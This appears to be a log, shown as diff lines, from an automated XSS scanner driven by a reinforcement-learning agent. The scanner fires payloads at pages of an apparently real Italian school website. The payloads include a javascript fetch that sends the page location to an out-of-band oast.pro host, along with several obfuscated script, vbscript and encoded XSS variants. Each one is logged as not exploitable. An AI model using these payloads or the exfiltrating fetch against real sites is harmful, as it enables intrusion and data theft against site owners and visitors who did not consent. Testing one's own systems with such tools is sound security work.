+2025-06-17 04:55:48,068 - INFO - [94m[INFO][0m Payload 'javascript:fetch('//rri5xlcaeffx.oast.pro/js?loc='+btoa(window.location))' not found or not exploitable in http://iislevimontalcini.it/cerca.[0m
+2025-06-17 04:55:48,068 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/cerca', 'cerca_sito', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=javascript:fetch('//rri5xlcaeffx.oast.pro/js?loc='+btoa(window.location)), Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:48,307 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:48,311 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:48,320 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione. NLP Reflected Type: none[0m
+2025-06-17 04:55:48,320 - INFO - [94m[INFO][0m Payload '<SWF><PARAM NAME=movie VALUE="javascript:al	ert(1)('XSS')"></PARAM><embed src="javascript:al	ert(1)('XSS')"></embed></SWF>' not found or not exploitable in http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione.[0m
+2025-06-17 04:55:48,320 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione', 'eml', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=<SWF><PARAM NAME=movie VALUE="javascript:al	ert(1)('XSS')"></PARAM><embed src="javascript:al	ert(1)('XSS')"></embed></SWF>, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:48,385 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:48,385 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:48,386 - INFO - [36m[RL Agent] Exploitation: State unknown or empty, selecting random action.[0m
+2025-06-17 04:55:48,445 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:48,451 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:48,480 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione. NLP Reflected Type: none[0m
+2025-06-17 04:55:48,481 - INFO - [94m[INFO][0m Payload '%3Ca%20foo%3Da%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E' not found or not exploitable in http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione.[0m
+2025-06-17 04:55:48,481 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione', 'act', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=%3Ca%20foo%3Da%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:49,752 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:49,757 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:49,770 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/pagine/cambridge. NLP Reflected Type: none[0m
+2025-06-17 04:55:49,770 - INFO - [94m[INFO][0m Payload '<img src="vbscript:alert('XSS')">' not found or not exploitable in http://iislevimontalcini.it/pagine/cambridge.[0m
+2025-06-17 04:55:49,771 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/pagine/cambridge', 'a', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=<img src="vbscript:alert('XSS')">, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:49,817 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:49,823 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:49,833 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/pagine/brochure-offerta-formativa. NLP Reflected Type: none[0m
+2025-06-17 04:55:49,833 - INFO - [94m[INFO][0m Payload '<ScRipT>ALErT(1)</SCrIPT>' not found or not exploitable in http://iislevimontalcini.it/pagine/brochure-offerta-formativa.[0m
+2025-06-17 04:55:49,833 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/pagine/brochure-offerta-formativa', 'a', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=<ScRipT>ALErT(1)</SCrIPT>, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:50,768 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:50,781 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:50,802 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione. NLP Reflected Type: none[0m
+2025-06-17 04:55:50,802 - INFO - [94m[INFO][0m Payload '&#x3c;a href="javascript:alert('XSS')"&#x3e;Click Me&#x3c;/a&#x3e;' not found or not exploitable in http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione.[0m
+2025-06-17 04:55:50,803 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione', 'captcha', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=&#x3c;a href="javascript:alert('XSS')"&#x3e;Click Me&#x3c;/a&#x3e;, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:50,872 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:50,872 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:50,873 - INFO - [36m[RL Agent] Exploitation: State unknown or empty, selecting random action.[0m
+2025-06-17 04:55:53,052 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:53,056 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:53,065 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione. NLP Reflected Type: none[0m
+2025-06-17 04:55:53,065 - INFO - [94m[INFO][0m Payload '<img sRc="VBscRIPT:ALErt('XSs')">' not found or not exploitable in http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione.[0m
+2025-06-17 04:55:53,065 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione', 'a', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=<img sRc="VBscRIPT:ALErt('XSs')">, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:53,076 - INFO - [1;32m[INFO][0m Report successfully generated at xss_report.html[0m
